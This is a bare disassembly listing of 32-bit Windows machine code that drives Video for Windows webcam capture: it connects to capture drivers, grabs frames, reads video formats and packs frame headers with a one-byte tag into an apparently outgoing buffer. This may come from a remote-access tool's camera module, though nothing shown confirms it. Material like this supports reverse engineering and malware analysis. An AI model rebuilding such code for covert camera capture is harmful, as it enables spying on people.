  409be7:	6a 00                	push   $0x0
  409be9:	6a 00                	push   $0x0
  409beb:	c7 06 fc b4 40 00    	movl   $0x40b4fc,(%esi)
  409bf1:	ff 15 e8 b1 40 00    	call   *0x40b1e8
  409bf7:	89 46 04             	mov    %eax,0x4(%esi)
  409bfa:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  409c01:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  409c08:	e8 c3 01 00 00       	call   0x409dd0
  409c0d:	84 c0                	test   %al,%al
  409c0f:	74 50                	je     0x409c61
  409c11:	a0 6c e9 40 00       	mov    0x40e96c,%al
  409c16:	84 c0                	test   %al,%al
  409c18:	75 47                	jne    0x409c61
  409c1a:	6a 00                	push   $0x0
  409c1c:	6a 00                	push   $0x0
  409c1e:	6a 00                	push   $0x0
  409c20:	6a 00                	push   $0x0
  409c22:	6a 00                	push   $0x0
  409c24:	6a 00                	push   $0x0
  409c26:	6a 00                	push   $0x0
  409c28:	6a 00                	push   $0x0
  409c2a:	68 00 00 00 80       	push   $0x80000000
  409c2f:	68 28 e7 40 00       	push   $0x40e728
  409c34:	68 f0 e6 40 00       	push   $0x40e6f0
  409c39:	6a 00                	push   $0x0
  409c3b:	ff 15 14 b3 40 00    	call   *0x40b314
  409c41:	6a 00                	push   $0x0
  409c43:	50                   	push   %eax
  409c44:	6a 00                	push   $0x0
  409c46:	6a 00                	push   $0x0
  409c48:	6a 00                	push   $0x0
  409c4a:	6a 00                	push   $0x0
  409c4c:	68 00 00 00 50       	push   $0x50000000
  409c51:	68 e4 e6 40 00       	push   $0x40e6e4
  409c56:	89 46 10             	mov    %eax,0x10(%esi)
  409c59:	e8 f8 0c 00 00       	call   0x40a956
  409c5e:	89 46 14             	mov    %eax,0x14(%esi)
  409c61:	8b c6                	mov    %esi,%eax
  409c63:	5e                   	pop    %esi
  409c64:	c3                   	ret
  409c65:	90                   	nop
  409c66:	90                   	nop
  409c67:	90                   	nop
  409c68:	90                   	nop
  409c69:	90                   	nop
  409c6a:	90                   	nop
  409c6b:	90                   	nop
  409c6c:	90                   	nop
  409c6d:	90                   	nop
  409c6e:	90                   	nop
  409c6f:	90                   	nop
  409c70:	56                   	push   %esi
  409c71:	8b f1                	mov    %ecx,%esi
  409c73:	e8 18 00 00 00       	call   0x409c90
  409c78:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  409c7d:	74 09                	je     0x409c88
  409c7f:	56                   	push   %esi
  409c80:	e8 61 0a 00 00       	call   0x40a6e6
  409c85:	83 c4 04             	add    $0x4,%esp
  409c88:	8b c6                	mov    %esi,%eax
  409c8a:	5e                   	pop    %esi
  409c8b:	c2 04 00             	ret    $0x4
  409c8e:	90                   	nop
  409c8f:	90                   	nop
  409c90:	53                   	push   %ebx
  409c91:	56                   	push   %esi
  409c92:	8b 1d 0c b3 40 00    	mov    0x40b30c,%ebx
  409c98:	8b f1                	mov    %ecx,%esi
  409c9a:	57                   	push   %edi
  409c9b:	8b 3d 2c b3 40 00    	mov    0x40b32c,%edi
  409ca1:	c7 06 fc b4 40 00    	movl   $0x40b4fc,(%esi)
  409ca7:	a0 6c e9 40 00       	mov    0x40e96c,%al
  409cac:	84 c0                	test   %al,%al
  409cae:	74 59                	je     0x409d09
  409cb0:	8b 46 14             	mov    0x14(%esi),%eax
  409cb3:	50                   	push   %eax
  409cb4:	ff d3                	call   *%ebx
  409cb6:	85 c0                	test   %eax,%eax
  409cb8:	74 0f                	je     0x409cc9
  409cba:	8b 4e 14             	mov    0x14(%esi),%ecx
  409cbd:	6a 00                	push   $0x0
  409cbf:	6a 00                	push   $0x0
  409cc1:	68 45 04 00 00       	push   $0x445
  409cc6:	51                   	push   %ecx
  409cc7:	ff d7                	call   *%edi
  409cc9:	8b 56 14             	mov    0x14(%esi),%edx
  409ccc:	52                   	push   %edx
  409ccd:	ff d3                	call   *%ebx
  409ccf:	85 c0                	test   %eax,%eax
  409cd1:	74 0f                	je     0x409ce2
  409cd3:	8b 46 14             	mov    0x14(%esi),%eax
  409cd6:	6a 00                	push   $0x0
  409cd8:	6a 00                	push   $0x0
  409cda:	68 0b 04 00 00       	push   $0x40b
  409cdf:	50                   	push   %eax
  409ce0:	ff d7                	call   *%edi
  409ce2:	8b 46 08             	mov    0x8(%esi),%eax
  409ce5:	85 c0                	test   %eax,%eax
  409ce7:	74 09                	je     0x409cf2
  409ce9:	50                   	push   %eax
  409cea:	e8 f7 09 00 00       	call   0x40a6e6
  409cef:	83 c4 04             	add    $0x4,%esp
  409cf2:	8b 46 0c             	mov    0xc(%esi),%eax
  409cf5:	85 c0                	test   %eax,%eax
  409cf7:	74 09                	je     0x409d02
  409cf9:	50                   	push   %eax
  409cfa:	e8 e7 09 00 00       	call   0x40a6e6
  409cff:	83 c4 04             	add    $0x4,%esp
  409d02:	c6 05 6c e9 40 00 00 	movb   $0x0,0x40e96c
  409d09:	8b 4e 14             	mov    0x14(%esi),%ecx
  409d0c:	51                   	push   %ecx
  409d0d:	ff d3                	call   *%ebx
  409d0f:	85 c0                	test   %eax,%eax
  409d11:	74 0f                	je     0x409d22
  409d13:	8b 56 14             	mov    0x14(%esi),%edx
  409d16:	6a 00                	push   $0x0
  409d18:	6a 00                	push   $0x0
  409d1a:	68 02 04 00 00       	push   $0x402
  409d1f:	52                   	push   %edx
  409d20:	ff d7                	call   *%edi
  409d22:	8b 46 14             	mov    0x14(%esi),%eax
  409d25:	50                   	push   %eax
  409d26:	ff d3                	call   *%ebx
  409d28:	85 c0                	test   %eax,%eax
  409d2a:	74 0f                	je     0x409d3b
  409d2c:	8b 4e 14             	mov    0x14(%esi),%ecx
  409d2f:	6a 00                	push   $0x0
  409d31:	6a 00                	push   $0x0
  409d33:	68 05 04 00 00       	push   $0x405
  409d38:	51                   	push   %ecx
  409d39:	ff d7                	call   *%edi
  409d3b:	8b 56 10             	mov    0x10(%esi),%edx
  409d3e:	8b 3d 10 b3 40 00    	mov    0x40b310,%edi
  409d44:	52                   	push   %edx
  409d45:	ff d7                	call   *%edi
  409d47:	8b 46 14             	mov    0x14(%esi),%eax
  409d4a:	50                   	push   %eax
  409d4b:	ff d7                	call   *%edi
  409d4d:	8b 4e 04             	mov    0x4(%esi),%ecx
  409d50:	51                   	push   %ecx
  409d51:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  409d57:	5f                   	pop    %edi
  409d58:	5e                   	pop    %esi
  409d59:	5b                   	pop    %ebx
  409d5a:	c3                   	ret
  409d5b:	90                   	nop
  409d5c:	90                   	nop
  409d5d:	90                   	nop
  409d5e:	90                   	nop
  409d5f:	90                   	nop
  409d60:	b8 01 00 00 00       	mov    $0x1,%eax
  409d65:	c2 0c 00             	ret    $0xc
  409d68:	90                   	nop
  409d69:	90                   	nop
  409d6a:	90                   	nop
  409d6b:	90                   	nop
  409d6c:	90                   	nop
  409d6d:	90                   	nop
  409d6e:	90                   	nop
  409d6f:	90                   	nop
  409d70:	56                   	push   %esi
  409d71:	8b 74 24 08          	mov    0x8(%esp),%esi
  409d75:	56                   	push   %esi
  409d76:	ff 15 0c b3 40 00    	call   *0x40b30c
  409d7c:	85 c0                	test   %eax,%eax
  409d7e:	74 43                	je     0x409dc3
  409d80:	6a 00                	push   $0x0
  409d82:	6a 00                	push   $0x0
  409d84:	68 08 04 00 00       	push   $0x408
  409d89:	56                   	push   %esi
  409d8a:	ff 15 2c b3 40 00    	call   *0x40b32c
  409d90:	85 c0                	test   %eax,%eax
  409d92:	74 2f                	je     0x409dc3
  409d94:	8b 48 08             	mov    0x8(%eax),%ecx
  409d97:	8b 54 24 0c          	mov    0xc(%esp),%edx
  409d9b:	57                   	push   %edi
  409d9c:	8b 78 0c             	mov    0xc(%eax),%edi
  409d9f:	8b 49 14             	mov    0x14(%ecx),%ecx
  409da2:	8b 32                	mov    (%edx),%esi
  409da4:	8b d1                	mov    %ecx,%edx
  409da6:	c1 e9 02             	shr    $0x2,%ecx
  409da9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409dab:	8b ca                	mov    %edx,%ecx
  409dad:	83 e1 03             	and    $0x3,%ecx
  409db0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  409db2:	8b 40 04             	mov    0x4(%eax),%eax
  409db5:	50                   	push   %eax
  409db6:	ff 15 d8 b1 40 00    	call   *0x40b1d8
  409dbc:	5f                   	pop    %edi
  409dbd:	33 c0                	xor    %eax,%eax
  409dbf:	5e                   	pop    %esi
  409dc0:	c2 08 00             	ret    $0x8
  409dc3:	33 c0                	xor    %eax,%eax
  409dc5:	5e                   	pop    %esi
  409dc6:	c2 08 00             	ret    $0x8
  409dc9:	90                   	nop
  409dca:	90                   	nop
  409dcb:	90                   	nop
  409dcc:	90                   	nop
  409dcd:	90                   	nop
  409dce:	90                   	nop
  409dcf:	90                   	nop
  409dd0:	a0 6c e9 40 00       	mov    0x40e96c,%al
  409dd5:	81 ec 98 00 00 00    	sub    $0x98,%esp
  409ddb:	84 c0                	test   %al,%al
  409ddd:	74 09                	je     0x409de8
  409ddf:	32 c0                	xor    %al,%al
  409de1:	81 c4 98 00 00 00    	add    $0x98,%esp
  409de7:	c3                   	ret
  409de8:	56                   	push   %esi
  409de9:	32 c0                	xor    %al,%al
  409deb:	33 f6                	xor    %esi,%esi
  409ded:	84 c0                	test   %al,%al
  409def:	75 1f                	jne    0x409e10
  409df1:	8d 44 24 04          	lea    0x4(%esp),%eax
  409df5:	6a 32                	push   $0x32
  409df7:	50                   	push   %eax
  409df8:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  409dfc:	6a 64                	push   $0x64
  409dfe:	51                   	push   %ecx
  409dff:	56                   	push   %esi
  409e00:	e8 4b 0b 00 00       	call   0x40a950
  409e05:	85 c0                	test   %eax,%eax
  409e07:	0f 95 c0             	setne  %al
  409e0a:	46                   	inc    %esi
  409e0b:	83 fe 0a             	cmp    $0xa,%esi
  409e0e:	7c dd                	jl     0x409ded
  409e10:	5e                   	pop    %esi
  409e11:	81 c4 98 00 00 00    	add    $0x98,%esp
  409e17:	c3                   	ret
  409e18:	90                   	nop
  409e19:	90                   	nop
  409e1a:	90                   	nop
  409e1b:	90                   	nop
  409e1c:	90                   	nop
  409e1d:	90                   	nop
  409e1e:	90                   	nop
  409e1f:	90                   	nop
  409e20:	56                   	push   %esi
  409e21:	8b f1                	mov    %ecx,%esi
  409e23:	8b 46 14             	mov    0x14(%esi),%eax
  409e26:	50                   	push   %eax
  409e27:	ff 15 0c b3 40 00    	call   *0x40b30c
  409e2d:	85 c0                	test   %eax,%eax
  409e2f:	74 13                	je     0x409e44
  409e31:	8b 4e 14             	mov    0x14(%esi),%ecx
  409e34:	6a 00                	push   $0x0
  409e36:	6a 00                	push   $0x0
  409e38:	68 3d 04 00 00       	push   $0x43d
  409e3d:	51                   	push   %ecx
  409e3e:	ff 15 2c b3 40 00    	call   *0x40b32c
  409e44:	8b 56 04             	mov    0x4(%esi),%edx
  409e47:	68 b8 0b 00 00       	push   $0xbb8
  409e4c:	52                   	push   %edx
  409e4d:	ff 15 dc b1 40 00    	call   *0x40b1dc
  409e53:	85 c0                	test   %eax,%eax
  409e55:	75 05                	jne    0x409e5c
  409e57:	8b 46 0c             	mov    0xc(%esi),%eax
  409e5a:	5e                   	pop    %esi
  409e5b:	c3                   	ret
  409e5c:	33 c0                	xor    %eax,%eax
  409e5e:	5e                   	pop    %esi
  409e5f:	c3                   	ret
  409e60:	83 ec 2c             	sub    $0x2c,%esp
  409e63:	53                   	push   %ebx
  409e64:	55                   	push   %ebp
  409e65:	56                   	push   %esi
  409e66:	57                   	push   %edi
  409e67:	8b f1                	mov    %ecx,%esi
  409e69:	e8 62 ff ff ff       	call   0x409dd0
  409e6e:	84 c0                	test   %al,%al
  409e70:	75 0a                	jne    0x409e7c
  409e72:	5f                   	pop    %edi
  409e73:	5e                   	pop    %esi
  409e74:	5d                   	pop    %ebp
  409e75:	5b                   	pop    %ebx
  409e76:	83 c4 2c             	add    $0x2c,%esp
  409e79:	c2 08 00             	ret    $0x8
  409e7c:	8b 46 14             	mov    0x14(%esi),%eax
  409e7f:	8b 2d 0c b3 40 00    	mov    0x40b30c,%ebp
  409e85:	50                   	push   %eax
  409e86:	ff d5                	call   *%ebp
  409e88:	8b 3d 2c b3 40 00    	mov    0x40b32c,%edi
  409e8e:	85 c0                	test   %eax,%eax
  409e90:	74 0e                	je     0x409ea0
  409e92:	8b 4e 14             	mov    0x14(%esi),%ecx
  409e95:	56                   	push   %esi
  409e96:	6a 00                	push   $0x0
  409e98:	68 09 04 00 00       	push   $0x409
  409e9d:	51                   	push   %ecx
  409e9e:	ff d7                	call   *%edi
  409ea0:	8b 56 14             	mov    0x14(%esi),%edx
  409ea3:	52                   	push   %edx
  409ea4:	ff d5                	call   *%ebp
  409ea6:	85 c0                	test   %eax,%eax
  409ea8:	74 12                	je     0x409ebc
  409eaa:	8b 46 14             	mov    0x14(%esi),%eax
  409ead:	68 60 9d 40 00       	push   $0x409d60
  409eb2:	6a 00                	push   $0x0
  409eb4:	68 02 04 00 00       	push   $0x402
  409eb9:	50                   	push   %eax
  409eba:	ff d7                	call   *%edi
  409ebc:	8b 4e 14             	mov    0x14(%esi),%ecx
  409ebf:	51                   	push   %ecx
  409ec0:	ff d5                	call   *%ebp
  409ec2:	85 c0                	test   %eax,%eax
  409ec4:	74 16                	je     0x409edc
  409ec6:	8b 56 14             	mov    0x14(%esi),%edx
  409ec9:	68 70 9d 40 00       	push   $0x409d70
  409ece:	6a 00                	push   $0x0
  409ed0:	68 05 04 00 00       	push   $0x405
  409ed5:	52                   	push   %edx
  409ed6:	ff d7                	call   *%edi
  409ed8:	85 c0                	test   %eax,%eax
  409eda:	75 0c                	jne    0x409ee8
  409edc:	5f                   	pop    %edi
  409edd:	5e                   	pop    %esi
  409ede:	5d                   	pop    %ebp
  409edf:	32 c0                	xor    %al,%al
  409ee1:	5b                   	pop    %ebx
  409ee2:	83 c4 2c             	add    $0x2c,%esp
  409ee5:	c2 08 00             	ret    $0x8
  409ee8:	33 db                	xor    %ebx,%ebx
  409eea:	8b 46 14             	mov    0x14(%esi),%eax
  409eed:	50                   	push   %eax
  409eee:	ff d5                	call   *%ebp
  409ef0:	85 c0                	test   %eax,%eax
  409ef2:	74 12                	je     0x409f06
  409ef4:	8b 4e 14             	mov    0x14(%esi),%ecx
  409ef7:	6a 00                	push   $0x0
  409ef9:	53                   	push   %ebx
  409efa:	68 0a 04 00 00       	push   $0x40a
  409eff:	51                   	push   %ecx
  409f00:	ff d7                	call   *%edi
  409f02:	85 c0                	test   %eax,%eax
  409f04:	75 06                	jne    0x409f0c
  409f06:	43                   	inc    %ebx
  409f07:	83 fb 0a             	cmp    $0xa,%ebx
  409f0a:	7c de                	jl     0x409eea
  409f0c:	83 fb 0a             	cmp    $0xa,%ebx
  409f0f:	75 0c                	jne    0x409f1d
  409f11:	5f                   	pop    %edi
  409f12:	5e                   	pop    %esi
  409f13:	5d                   	pop    %ebp
  409f14:	32 c0                	xor    %al,%al
  409f16:	5b                   	pop    %ebx
  409f17:	83 c4 2c             	add    $0x2c,%esp
  409f1a:	c2 08 00             	ret    $0x8
  409f1d:	8b 56 14             	mov    0x14(%esi),%edx
  409f20:	52                   	push   %edx
  409f21:	ff d5                	call   *%ebp
  409f23:	85 c0                	test   %eax,%eax
  409f25:	74 13                	je     0x409f3a
  409f27:	8b 46 14             	mov    0x14(%esi),%eax
  409f2a:	6a 00                	push   $0x0
  409f2c:	6a 00                	push   $0x0
  409f2e:	68 2c 04 00 00       	push   $0x42c
  409f33:	50                   	push   %eax
  409f34:	ff d7                	call   *%edi
  409f36:	8b d8                	mov    %eax,%ebx
  409f38:	eb 02                	jmp    0x409f3c
  409f3a:	33 db                	xor    %ebx,%ebx
  409f3c:	6a 2c                	push   $0x2c
  409f3e:	e8 9d 07 00 00       	call   0x40a6e0
  409f43:	8b 4e 14             	mov    0x14(%esi),%ecx
  409f46:	83 c4 04             	add    $0x4,%esp
  409f49:	89 46 08             	mov    %eax,0x8(%esi)
  409f4c:	51                   	push   %ecx
  409f4d:	ff d5                	call   *%ebp
  409f4f:	85 c0                	test   %eax,%eax
  409f51:	74 10                	je     0x409f63
  409f53:	8b 56 08             	mov    0x8(%esi),%edx
  409f56:	8b 46 14             	mov    0x14(%esi),%eax
  409f59:	52                   	push   %edx
  409f5a:	53                   	push   %ebx
  409f5b:	68 2c 04 00 00       	push   $0x42c
  409f60:	50                   	push   %eax
  409f61:	ff d7                	call   *%edi
  409f63:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  409f67:	bb 01 00 00 00       	mov    $0x1,%ebx
  409f6c:	85 c9                	test   %ecx,%ecx
  409f6e:	74 63                	je     0x409fd3
  409f70:	8b 44 24 44          	mov    0x44(%esp),%eax
  409f74:	85 c0                	test   %eax,%eax
  409f76:	74 5b                	je     0x409fd3
  409f78:	8b 56 08             	mov    0x8(%esi),%edx
  409f7b:	89 4a 04             	mov    %ecx,0x4(%edx)
  409f7e:	8b 4e 08             	mov    0x8(%esi),%ecx
  409f81:	89 41 08             	mov    %eax,0x8(%ecx)
  409f84:	8b 56 08             	mov    0x8(%esi),%edx
  409f87:	33 c9                	xor    %ecx,%ecx
  409f89:	66 89 5a 0c          	mov    %bx,0xc(%edx)
  409f8d:	8b 46 08             	mov    0x8(%esi),%eax
  409f90:	66 8b 48 0e          	mov    0xe(%eax),%cx
  409f94:	0f af 48 04          	imul   0x4(%eax),%ecx
  409f98:	83 c1 1f             	add    $0x1f,%ecx
  409f9b:	c1 f9 03             	sar    $0x3,%ecx
  409f9e:	83 e1 fc             	and    $0xfffffffc,%ecx
  409fa1:	0f af 48 08          	imul   0x8(%eax),%ecx
  409fa5:	89 48 14             	mov    %ecx,0x14(%eax)
  409fa8:	8b 56 14             	mov    0x14(%esi),%edx
  409fab:	52                   	push   %edx
  409fac:	ff d5                	call   *%ebp
  409fae:	85 c0                	test   %eax,%eax
  409fb0:	74 15                	je     0x409fc7
  409fb2:	8b 46 08             	mov    0x8(%esi),%eax
  409fb5:	8b 4e 14             	mov    0x14(%esi),%ecx
  409fb8:	50                   	push   %eax
  409fb9:	6a 2c                	push   $0x2c
  409fbb:	68 2d 04 00 00       	push   $0x42d
  409fc0:	51                   	push   %ecx
  409fc1:	ff d7                	call   *%edi
  409fc3:	85 c0                	test   %eax,%eax
  409fc5:	75 0c                	jne    0x409fd3
  409fc7:	5f                   	pop    %edi
  409fc8:	5e                   	pop    %esi
  409fc9:	5d                   	pop    %ebp
  409fca:	32 c0                	xor    %al,%al
  409fcc:	5b                   	pop    %ebx
  409fcd:	83 c4 2c             	add    $0x2c,%esp
  409fd0:	c2 08 00             	ret    $0x8
  409fd3:	8b 56 08             	mov    0x8(%esi),%edx
  409fd6:	8b 42 14             	mov    0x14(%edx),%eax
  409fd9:	50                   	push   %eax
  409fda:	e8 01 07 00 00       	call   0x40a6e0
  409fdf:	8b 4e 14             	mov    0x14(%esi),%ecx
  409fe2:	83 c4 04             	add    $0x4,%esp
  409fe5:	89 46 0c             	mov    %eax,0xc(%esi)
  409fe8:	51                   	push   %ecx
  409fe9:	ff d5                	call   *%ebp
  409feb:	85 c0                	test   %eax,%eax
  409fed:	74 12                	je     0x40a001
  409fef:	8b 46 14             	mov    0x14(%esi),%eax
  409ff2:	8d 54 24 10          	lea    0x10(%esp),%edx
  409ff6:	52                   	push   %edx
  409ff7:	6a 2c                	push   $0x2c
  409ff9:	68 0e 04 00 00       	push   $0x40e
  409ffe:	50                   	push   %eax
  409fff:	ff d7                	call   *%edi
  40a001:	8b 4e 14             	mov    0x14(%esi),%ecx
  40a004:	51                   	push   %ecx
  40a005:	ff d5                	call   *%ebp
  40a007:	85 c0                	test   %eax,%eax
  40a009:	74 0f                	je     0x40a01a
  40a00b:	8b 56 14             	mov    0x14(%esi),%edx
  40a00e:	6a 00                	push   $0x0
  40a010:	6a 00                	push   $0x0
  40a012:	68 33 04 00 00       	push   $0x433
  40a017:	52                   	push   %edx
  40a018:	ff d7                	call   *%edi
  40a01a:	8b 46 14             	mov    0x14(%esi),%eax
  40a01d:	50                   	push   %eax
  40a01e:	ff d5                	call   *%ebp
  40a020:	85 c0                	test   %eax,%eax
  40a022:	74 0f                	je     0x40a033
  40a024:	8b 4e 14             	mov    0x14(%esi),%ecx
  40a027:	6a 00                	push   $0x0
  40a029:	6a 00                	push   $0x0
  40a02b:	68 32 04 00 00       	push   $0x432
  40a030:	51                   	push   %ecx
  40a031:	ff d7                	call   *%edi
  40a033:	8b 56 14             	mov    0x14(%esi),%edx
  40a036:	52                   	push   %edx
  40a037:	ff d5                	call   *%ebp
  40a039:	85 c0                	test   %eax,%eax
  40a03b:	74 0f                	je     0x40a04c
  40a03d:	8b 46 14             	mov    0x14(%esi),%eax
  40a040:	6a 00                	push   $0x0
  40a042:	6a 00                	push   $0x0
  40a044:	68 35 04 00 00       	push   $0x435
  40a049:	50                   	push   %eax
  40a04a:	ff d7                	call   *%edi
  40a04c:	5f                   	pop    %edi
  40a04d:	5e                   	pop    %esi
  40a04e:	88 1d 6c e9 40 00    	mov    %bl,0x40e96c
  40a054:	8a c3                	mov    %bl,%al
  40a056:	5d                   	pop    %ebp
  40a057:	5b                   	pop    %ebx
  40a058:	83 c4 2c             	add    $0x2c,%esp
  40a05b:	c2 08 00             	ret    $0x8
  40a05e:	90                   	nop
  40a05f:	90                   	nop
  40a060:	6a ff                	push   $0xffffffff
  40a062:	68 b8 ad 40 00       	push   $0x40adb8
  40a067:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40a06d:	50                   	push   %eax
  40a06e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40a075:	51                   	push   %ecx
  40a076:	8b 44 24 14          	mov    0x14(%esp),%eax
  40a07a:	56                   	push   %esi
  40a07b:	8b f1                	mov    %ecx,%esi
  40a07d:	50                   	push   %eax
  40a07e:	89 74 24 08          	mov    %esi,0x8(%esp)
  40a082:	e8 99 be ff ff       	call   0x405f20
  40a087:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a08c:	33 c0                	xor    %eax,%eax
  40a08e:	51                   	push   %ecx
  40a08f:	50                   	push   %eax
  40a090:	50                   	push   %eax
  40a091:	56                   	push   %esi
  40a092:	68 80 a3 40 00       	push   $0x40a380
  40a097:	50                   	push   %eax
  40a098:	50                   	push   %eax
  40a099:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40a09d:	c7 06 00 b5 40 00    	movl   $0x40b500,(%esi)
  40a0a3:	89 46 14             	mov    %eax,0x14(%esi)
  40a0a6:	89 46 18             	mov    %eax,0x18(%esi)
  40a0a9:	88 4e 10             	mov    %cl,0x10(%esi)
  40a0ac:	88 4e 28             	mov    %cl,0x28(%esi)
  40a0af:	89 46 20             	mov    %eax,0x20(%esi)
  40a0b2:	89 46 24             	mov    %eax,0x24(%esi)
  40a0b5:	89 46 1c             	mov    %eax,0x1c(%esi)
  40a0b8:	e8 b3 f4 ff ff       	call   0x409570
  40a0bd:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40a0c1:	83 c4 1c             	add    $0x1c,%esp
  40a0c4:	89 46 2c             	mov    %eax,0x2c(%esi)
  40a0c7:	8b c6                	mov    %esi,%eax
  40a0c9:	5e                   	pop    %esi
  40a0ca:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a0d1:	83 c4 10             	add    $0x10,%esp
  40a0d4:	c2 04 00             	ret    $0x4
  40a0d7:	90                   	nop
  40a0d8:	90                   	nop
  40a0d9:	90                   	nop
  40a0da:	90                   	nop
  40a0db:	90                   	nop
  40a0dc:	90                   	nop
  40a0dd:	90                   	nop
  40a0de:	90                   	nop
  40a0df:	90                   	nop
  40a0e0:	56                   	push   %esi
  40a0e1:	8b f1                	mov    %ecx,%esi
  40a0e3:	e8 18 00 00 00       	call   0x40a100
  40a0e8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40a0ed:	74 09                	je     0x40a0f8
  40a0ef:	56                   	push   %esi
  40a0f0:	e8 f1 05 00 00       	call   0x40a6e6
  40a0f5:	83 c4 04             	add    $0x4,%esp
  40a0f8:	8b c6                	mov    %esi,%eax
  40a0fa:	5e                   	pop    %esi
  40a0fb:	c2 04 00             	ret    $0x4
  40a0fe:	90                   	nop
  40a0ff:	90                   	nop
  40a100:	56                   	push   %esi
  40a101:	8b f1                	mov    %ecx,%esi
  40a103:	6a 00                	push   $0x0
  40a105:	8d 46 10             	lea    0x10(%esi),%eax
  40a108:	c7 06 00 b5 40 00    	movl   $0x40b500,(%esi)
  40a10e:	50                   	push   %eax
  40a10f:	ff 15 bc b0 40 00    	call   *0x40b0bc
  40a115:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  40a118:	6a ff                	push   $0xffffffff
  40a11a:	51                   	push   %ecx
  40a11b:	ff 15 dc b1 40 00    	call   *0x40b1dc
  40a121:	8b 56 2c             	mov    0x2c(%esi),%edx
  40a124:	52                   	push   %edx
  40a125:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  40a12b:	8b ce                	mov    %esi,%ecx
  40a12d:	e8 3e be ff ff       	call   0x405f70
  40a132:	5e                   	pop    %esi
  40a133:	c3                   	ret
  40a134:	90                   	nop
  40a135:	90                   	nop
  40a136:	90                   	nop
  40a137:	90                   	nop
  40a138:	90                   	nop
  40a139:	90                   	nop
  40a13a:	90                   	nop
  40a13b:	90                   	nop
  40a13c:	90                   	nop
  40a13d:	90                   	nop
  40a13e:	90                   	nop
  40a13f:	90                   	nop
  40a140:	8b 54 24 04          	mov    0x4(%esp),%edx
  40a144:	33 c0                	xor    %eax,%eax
  40a146:	8a 02                	mov    (%edx),%al
  40a148:	83 c0 e5             	add    $0xffffffe5,%eax
  40a14b:	83 f8 03             	cmp    $0x3,%eax
  40a14e:	77 41                	ja     0x40a191
  40a150:	ff 24 85 94 a1 40 00 	jmp    *0x40a194(,%eax,4)
  40a157:	e8 d4 be ff ff       	call   0x406030
  40a15c:	c2 08 00             	ret    $0x8
  40a15f:	8b 41 18             	mov    0x18(%ecx),%eax
  40a162:	85 c0                	test   %eax,%eax
  40a164:	74 2b                	je     0x40a191
  40a166:	83 c1 28             	add    $0x28,%ecx
  40a169:	6a 01                	push   $0x1
  40a16b:	51                   	push   %ecx
  40a16c:	ff 15 bc b0 40 00    	call   *0x40b0bc
  40a172:	c2 08 00             	ret    $0x8
  40a175:	83 c1 28             	add    $0x28,%ecx
  40a178:	6a 00                	push   $0x0
  40a17a:	51                   	push   %ecx
  40a17b:	ff 15 bc b0 40 00    	call   *0x40b0bc
  40a181:	c2 08 00             	ret    $0x8
  40a184:	8b 42 05             	mov    0x5(%edx),%eax
  40a187:	8b 52 01             	mov    0x1(%edx),%edx
  40a18a:	50                   	push   %eax
  40a18b:	52                   	push   %edx
  40a18c:	e8 8f 01 00 00       	call   0x40a320
  40a191:	c2 08 00             	ret    $0x8
  40a194:	5f                   	pop    %edi
  40a195:	a1 40 00 75 a1       	mov    0xa1750040,%eax
  40a19a:	40                   	inc    %eax
  40a19b:	00 84 a1 40 00 57 a1 	add    %al,-0x5ea8ffc0(%ecx,%eiz,4)
  40a1a2:	40                   	inc    %eax
  40a1a3:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  40a1a9:	90                   	nop
  40a1aa:	90                   	nop
  40a1ab:	90                   	nop
  40a1ac:	90                   	nop
  40a1ad:	90                   	nop
  40a1ae:	90                   	nop
  40a1af:	90                   	nop
  40a1b0:	53                   	push   %ebx
  40a1b1:	55                   	push   %ebp
  40a1b2:	8b e9                	mov    %ecx,%ebp
  40a1b4:	6a 2d                	push   $0x2d
  40a1b6:	e8 25 05 00 00       	call   0x40a6e0
  40a1bb:	8b d8                	mov    %eax,%ebx
  40a1bd:	83 c4 04             	add    $0x4,%esp
  40a1c0:	85 db                	test   %ebx,%ebx
  40a1c2:	74 2a                	je     0x40a1ee
  40a1c4:	c6 03 77             	movb   $0x77,(%ebx)
  40a1c7:	8b 45 14             	mov    0x14(%ebp),%eax
  40a1ca:	56                   	push   %esi
  40a1cb:	57                   	push   %edi
  40a1cc:	8b 70 08             	mov    0x8(%eax),%esi
  40a1cf:	8d 7b 01             	lea    0x1(%ebx),%edi
  40a1d2:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a1d7:	6a 2d                	push   $0x2d
  40a1d9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40a1db:	53                   	push   %ebx
  40a1dc:	8b cd                	mov    %ebp,%ecx
  40a1de:	e8 bd bd ff ff       	call   0x405fa0
  40a1e3:	53                   	push   %ebx
  40a1e4:	e8 fd 04 00 00       	call   0x40a6e6
  40a1e9:	83 c4 04             	add    $0x4,%esp
  40a1ec:	5f                   	pop    %edi
  40a1ed:	5e                   	pop    %esi
  40a1ee:	5d                   	pop    %ebp
  40a1ef:	5b                   	pop    %ebx
  40a1f0:	c3                   	ret
  40a1f1:	90                   	nop
  40a1f2:	90                   	nop
  40a1f3:	90                   	nop
  40a1f4:	90                   	nop
  40a1f5:	90                   	nop
  40a1f6:	90                   	nop
  40a1f7:	90                   	nop
  40a1f8:	90                   	nop
  40a1f9:	90                   	nop
  40a1fa:	90                   	nop
  40a1fb:	90                   	nop
  40a1fc:	90                   	nop
  40a1fd:	90                   	nop
  40a1fe:	90                   	nop
  40a1ff:	90                   	nop
  40a200:	83 ec 0c             	sub    $0xc,%esp
  40a203:	53                   	push   %ebx
  40a204:	8b d9                	mov    %ecx,%ebx
  40a206:	55                   	push   %ebp
  40a207:	56                   	push   %esi
  40a208:	8b 4b 14             	mov    0x14(%ebx),%ecx
